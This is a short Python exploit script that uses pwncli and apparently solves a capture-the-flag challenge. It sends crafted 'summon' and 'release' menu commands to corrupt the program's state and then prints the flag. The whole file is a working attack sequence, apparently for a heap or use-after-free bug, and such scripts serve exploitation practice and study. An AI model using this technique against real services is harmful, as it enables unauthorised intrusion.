#!/usr/bin/python3
from pwncli import *

cli_script()

p:tube = gift['io']

p.sendlineafter("> ", "summon "+"a"*8+"\x05")
p.sendlineafter("> ", "release")

p.sendlineafter("> ", "summon "+"a"*1)
p.sendlineafter("> ", "strike")

flag = p.recvline_startswith("flag")
log_ex_highlight(f"{flag}")

p.sendlineafter("> ", "quit")

p.interactive()